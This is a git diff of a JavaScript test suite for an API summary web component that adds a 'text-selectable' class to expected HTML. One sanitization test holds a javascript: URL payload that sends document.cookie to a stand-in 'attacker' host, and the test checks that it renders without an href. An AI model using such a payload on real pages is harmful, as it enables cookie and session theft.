@@ -47,7 +47,7 @@ describe('ApiSummaryElement', () => {
             <label part="api-title-label">
               API title:
             </label>
-            <span>
+            <span class="text-selectable">
               API body demo
             </span>
           </div>`);
@@ -55,7 +55,7 @@ describe('ApiSummaryElement', () => {
 
         it('renders version', () => {
           const node = element.shadowRoot.querySelector('.inline-description.version span');
-          assert.dom.equal(node, '<span>v1</span>');
+          assert.dom.equal(node, '<span class="text-selectable">v1</span>');
         });
 
         it('renders protocols', () => {
@@ -63,10 +63,10 @@ describe('ApiSummaryElement', () => {
           assert.dom.equal(
             node,
             `<div class="protocol-chips">
-            <span class="chip">
+            <span class="chip text-selectable">
                 HTTP
             </span>
-            <span class="chip">
+            <span class="chip text-selectable">
               HTTPS
             </span>
           </div>`
@@ -123,14 +123,14 @@ describe('ApiSummaryElement', () => {
 
         it('renders provider name', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
-          assert.dom.equal(node, `<span class="provider-name">John Becker</span>`);
+          assert.dom.equal(node, `<span class="provider-name text-selectable">John Becker</span>`);
         });
 
         it('renders provider email', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
           assert.dom.equal(
             node,
-            `<a class="app-link link-padding provider-email" href="mailto:JohnBecker@cognizant.com">
+            `<a class="app-link link-padding provider-email text-selectable" href="mailto:JohnBecker@cognizant.com">
             JohnBecker@cognizant.com
           </a>`
           );
@@ -140,7 +140,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
           assert.dom.equal(
             node,
-            `<a class="app-link provider-url" href="http://domain.com" target="_blank">http://domain.com</a>`
+            `<a class="app-link provider-url text-selectable" href="http://domain.com" target="_blank">http://domain.com</a>`
           );
         });
 
@@ -153,7 +153,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
           assert.dom.equal(
             node,
-            `<a class="app-link" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
+            `<a class="app-link text-selectable" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
             Apache 2.0
           </a>`
           );
@@ -185,14 +185,14 @@ describe('ApiSummaryElement', () => {
 
         it('renders provider name', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
-          assert.dom.equal(node, `<span class="provider-name">Wally</span>`);
+          assert.dom.equal(node, `<span class="provider-name text-selectable">Wally</span>`);
         });
 
         it('renders provider email', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
           assert.dom.equal(
             node,
-            `<a class="app-link link-padding provider-email" href="mailto:wallythebest@wally.com">
+            `<a class="app-link link-padding provider-email text-selectable" href="mailto:wallythebest@wally.com">
             wallythebest@wally.com
           </a>`
           );
@@ -202,7 +202,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
           assert.dom.equal(
             node,
-            `<a class="app-link provider-url" target="_blank">
+            `<a class="app-link provider-url text-selectable" target="_blank">
               javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
           );
         });
@@ -216,7 +216,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
           assert.dom.equal(
             node,
-            `<a class="app-link" target="_blank">
+            `<a class="app-link text-selectable" target="_blank">
             I swear if you click below you will have the most amazing experience ever. I promise.
           </a>`
           );
@@ -256,7 +256,7 @@ describe('ApiSummaryElement', () => {
           assert.dom.equal(
             node,
             `<a
-              class="endpoint-path"
+              class="endpoint-path text-selectable"
               data-shape-type="resource"
               href="#/people"
               title="Open endpoint documentation"
